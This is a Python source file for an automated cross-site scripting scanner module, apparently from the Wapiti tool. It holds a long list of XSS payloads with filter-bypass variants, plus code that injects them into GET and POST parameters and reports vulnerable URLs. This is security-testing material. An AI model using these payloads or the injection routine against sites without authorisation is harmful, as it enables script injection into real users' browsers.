#!/usr/bin/env python
import BeautifulSoup

class XSS:
  # magic strings me must see to be sure script is vulnerable to XSS
  # payloads must be created on those paterns
  script_ok=[
      "alert('__XSS__')",
      "alert(\"__XSS__\")",
      "String.fromCharCode(0,__XSS__,1)"
      ]
    
  # simple payloads that doesn't rely on their position in the DOM structure
  # payloads injected after closing a tag aatibute value (attrval) or in the
  # content of a tag (text node like beetween <p> and </p>)
  # only trick here must be on character encoding, filter bypassing, stuff like that
  # form the simplest to the most complex, Wapiti will stop on the first working
  independant_payloads=[
      "<script>alert('__XSS__')</script>",
      "<script>alert(\"__XSS__\")</script>",
      "<ScRiPt>alert('__XSS__')</sCrIpT>", # stupid case-sensitive filter on <script>
      "<ScRiPt>alert(\"__XSS__\")</sCrIpT>",
      "<script>String.fromCharCode(0,__XSS__,1)</script>",
      "<ScRiPt>String.fromCharCode(0,__XSS__,1)</sCrIpT>",
      "<script src=http://__XSS__/x.js></script>", # simple but can be effetive
      "<ScRiPt src=http://__XSS__/x.js></sCrIpT>",

      "<img src=javascript:alert('__XSS__') />", # no script, no problem :p
      "<img src=javascript:alert(\"__XSS__\") />",
      "<img src=javascript:String.fromCharCode(0,__XSS__,1) />",
      "<img src=JaVaScRiPt:String.fromCharCode(0,__XSS__,1) />",
      "<img src=JaVaS\tcRiPt:String.fromCharCode(0,__XSS__,1) />",
      "<img src=jav&#x09;ascript:alert('__XSS__'); />",
      "<img src=jav&#x09;ascript:alert(\"__XSS__\"); />",
      "<img src=validimg.png onload=alert(\"__XSS__\") />",
      "<img src=validimg.png onload=alert('__XSS__') />",
      "<img src=validimg.png onload:String.fromCharCode(0,__XSS__,1) />",

      # for masturbating monkeys only
      "<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;__XSS__;&#39;&#41; />",
      "<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27__XSS__&#x27&#x29 />",

      "<script >alert('__XSS__')</script >", # yet another stupid bypass on <script>
      "<script >alert(\"__XSS__\")</script >",
      "<script >String.fromCharCode(0,__XSS__,1)</script >",
      "<ScRiPt >String.fromCharCode(0,__XSS__,1)</ sCrIpT>",
      "<script/>alert('__XSS__')</script/>", # yup it works
      "<script/>alert(\"__XSS__\")</script/>",
      "<ScRiPt/>alert('__XSS__')</sCrIpT/>",
      "<ScRiPt/>alert(\"__XSS__\")</sCrIpT/>",
      "<script/ src=http://__XSS__/x.js></script/>",
      "<ScRiPt/ src=http://__XSS__/x.js></sCrIpT/>",
      "<scr<script>ipt>alert('__XSS__')</script>", # stupid <script> remove
      "<scr<script>ipt>alert('__XSS__')</scr</script>ipt>", # and </script>
      "<scr<script>ipt>alert(\"__XSS__\")</script>",
      "<scr<script>ipt>alert(\"__XSS__\")</scr</script>ipt>", # and </script>
      "<scr<script>ipt>String.fromCharCode(0,__XSS__,1)</script>",
      "<scr<script>ipt>String.fromCharCode(0,__XSS__,1)</scr</script>ipt>",
      "<scr<script>ipt src=http://__XSS__/x.js></script>",
      "<scr<script>ipt src=http://__XSS__/x.js></scr</script>ipt>",
      "<object><param name=x value=javascript:alert('__XSS__')></object>",
      "<object><param name=x value=javascript:alert(\"__XSS__\")></object>",
      "<object><param name=x value=javascript:String.fromCharCode(0,__XSS__,1)></object>"
      ]

  HTTP=None
  GET_XSS={}
  color=0
  verbose=0

  def __init__(self,HTTP):
    self.HTTP=HTTP

  # type/name/tag ex: attrval/img/src
  def study(self,obj,parent=None,keyword="",entries=[]):
    #if parent==None:
    #  print "Keyword is:",keyword
    if str(obj).find(keyword)>=0:
      if isinstance(obj,BeautifulSoup.Tag):
        if str(obj.attrs).find(keyword)>=0:
          for k,v in obj.attrs:
            if v.find(keyword)>=0:
              #print "Found in attribute value ",k,"of tag",obj.name
              entries.append({"type":"attrval","name":k,"tag":obj.name})
            if k.find(keyword)>=0:
              #print "Found in attribute name ",k,"of tag",obj.name
              entries.append({"type":"attrname","name":k,"tag":obj.name})
        elif obj.name.find(keyword)>=0:
          #print "Found in tag name"
          entries.append({"type":"tag","value":obj.name})
        else:
          for x in obj.contents:
            self.study(x,obj,keyword,entries)
      elif isinstance(obj,BeautifulSoup.NavigableString):
        if str(obj).find(keyword)>=0:
          #print "Found in text, tag", parent.name
          entries.append({"type":"text","parent":parent.name})

  def validXSS(self,page,code):
    soup=BeautifulSoup.BeautifulSoup(page)
    for x in soup.findAll("script"):
      #if x.string != None: print "-"+x.string+"-"
      if x.string!=None and x.string in [t.replace("__XSS__",code) for t in XSS.script_ok]:
        return True
      elif x.has_key("src"):
        if x["src"]=="http://__XSS__/x.js".replace("__XSS__",code):
          return True
    return False



  # GET and POST methods here
  def findXSS(self,data,page,params,var,code,url_src=""):
    headers={"Accept": "text/plain"}
    soup=BeautifulSoup.BeautifulSoup(data) # il faut garder la page non-retouchee en reserve...
    e=[]
    self.study(soup,keyword=code,entries=e)
    for elem in e:
      payload=""
      # traiter chaque entree au cas par cas
      # on quitte a la premiere entree exploitable

      # common situation
      if elem['type']=="attrval":
        #print "tag->"+elem['tag']
        #print elem['name']
        i0=data.find(code)
        #i1=data[:i0].rfind("=")
        try:
          i1=data[:i0].rfind(elem['name'])
        # stupid unicode errors, must check later
        except UnicodeDecodeError:
          continue

        start=data[i1:i0].replace(" ","")[len(elem['name']):]
        print "start="+start
        if start.startswith("='"): payload="'"
        if start.startswith('="'): payload='"'
        if elem['tag'].lower()=="img":
          payload+="/>"
        else:
          payload+="></"+elem['tag']+">"
        for xss in self.independant_payloads:
          params[var]=payload+xss.replace("__XSS__",code)
          #if (page,tmp) not in self.attackedPOST:
          if url_src!="": #POST
            if self.verbose==2:
              print "+ "+page
              print "  ",params
            dat=self.HTTP.send(page,self.HTTP.uqe(params),headers).getPage()
          else:#GET
            url=page+"?"+self.HTTP.uqe(params)
            dat=self.HTTP.send(url).getPage()

          if self.validXSS(dat,code):
            if url_src!="":
              print "Found XSS in",page
              print "  with params =",self.HTTP.encode(params)
              print "  coming from",url_src

            else:
              if self.color==0:
                print "XSS ("+var+") in",page
                print "\tEvil url:",url
              else:
                print "XSS",":",url.replace(var+"=","\033[0;31m"+var+"\033[0;0m=")
            return True

      # this should not happen but you never know...
      elif elem['type']=="attrname": # name,tag
        #print "attrname"
        if code==elem['name']:
          for xss in self.independant_payloads:
            params[var]='>'+xss.replace("__XSS__",code)

            if url_src!="": #POST
              if self.verbose==2:
                print "+ "+page
                print "  ",params
              dat=self.HTTP.send(page,self.HTTP.uqe(params),headers).getPage()
            else:
              url=page+"?"+self.HTTP.uqe(params)
              dat=self.HTTP.send(url).getPage()

            if self.validXSS(dat,code):
              if url_src!="":
                print "Found XSS in",page
                print "  with params =",self.HTTP.encode(params)
                print "  coming from",url_src

              else:
                if self.color==0:
                  print "XSS ("+var+") in",page
                  print "\tEvil url:",url
                else:
                  print "XSS",":",url.replace(var+"=","\033[0;31m"+var+"\033[0;0m=")
              return True

      elif elem['type']=="tag":
        if elem['value'].startswith(code):
          # use independant payloads, just remove the first character (<)
          for xss in self.independant_payloads:
            params[var]=xss.replace("__XSS__",code)[1:]

            if url_src!="": #POST
              if self.verbose==2:
                print "+ "+page
                print "  ",params
              dat=self.HTTP.send(page,self.HTTP.uqe(params),headers).getPage()
            else:
              url=page+"?"+self.HTTP.uqe(params)
              dat=self.HTTP.send(url).getPage()

            if self.validXSS(dat,code):
              if url_src!="":
                print "Found XSS in",page
                print "  with params =",self.HTTP.encode(params)
                print "  coming from",url_src

              else:
                if self.color==0:
                  print "XSS ("+var+") in",page
                  print "\tEvil url:",url
                else:
                  print "XSS",":",url.replace(var+"=","\033[0;31m"+var+"\033[0;0m=")
              return True
        else:
          for xss in self.independant_payloads:
            #close tag and inject independant payloads
            params[var]="/>"+xss.replace("__XSS__",code)

            if url_src!="": #POST
              if self.verbose==2:
                print "+ "+page
                print "  ",params
              dat=self.HTTP.send(page,self.HTTP.uqe(params),headers).getPage()
            else:
              url=page+"?"+self.HTTP.uqe(params)
              dat=self.HTTP.send(url).getPage()

            if self.validXSS(dat,code):
              if url_src!="":
                print "Found XSS in",page
                print "  with params =",self.HTTP.encode(params)
                print "  coming from",url_src

              else:
                if self.color==0:
                  print "XSS ("+var+") in",page
                  print "\tEvil url:",url
                else:
                  print "XSS",":",url.replace(var+"=","\033[0;31m"+var+"\033[0;0m=")
              return True

      # another common one
      elif elem['type']=="text":
        payload=""
        if elem['parent']=="title": # Oops we are in the head
          payload="</title>"

        for xss in self.independant_payloads:
          params[var]=payload+xss.replace("__XSS__",code)

          if url_src!="": #POST
            if self.verbose==2:
              print "+ "+page
              print "  ",params
            dat=self.HTTP.send(page,self.HTTP.uqe(params),headers).getPage()
          else:
            url=page+"?"+self.HTTP.uqe(params)
            dat=self.HTTP.send(url).getPage()

          if self.validXSS(dat,code):
            if url_src!="":
              print "Found XSS in",page
              print "  with params =",self.HTTP.encode(params)
              print "  coming from",url_src

            else:
              if self.color==0:
                print "XSS ("+var+") in",page
                print "\tEvil url:",url
              else:
                print "XSS",":",url.replace(var+"=","\033[0;31m"+var+"\033[0;0m=")
            return True

      #data=data.partition(code)[2] #reduire la zone de recherche
      data=data.replace(code,"none",1)#reduire la zone de recherche
    return False
